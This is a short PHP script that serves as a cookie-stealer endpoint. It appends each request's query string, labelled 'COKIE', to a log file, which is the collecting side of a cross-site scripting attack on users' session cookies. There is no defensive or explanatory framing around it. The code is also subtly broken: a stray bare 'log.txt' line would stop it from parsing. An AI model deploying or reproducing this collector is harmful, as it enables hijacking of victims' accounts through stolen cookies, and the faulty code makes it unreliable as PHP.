<?php

	function logData()
	{
		$ipLog = "log.txt";
		$cookie = $_SERVER['QUERY_STRING'];
		$log = fopen("$ipLog", "a+");
		fputs($log, "COKIE: $cookie\n\n");
		log.txt 
		fclose($log);
		
	}
	logData();
	?>
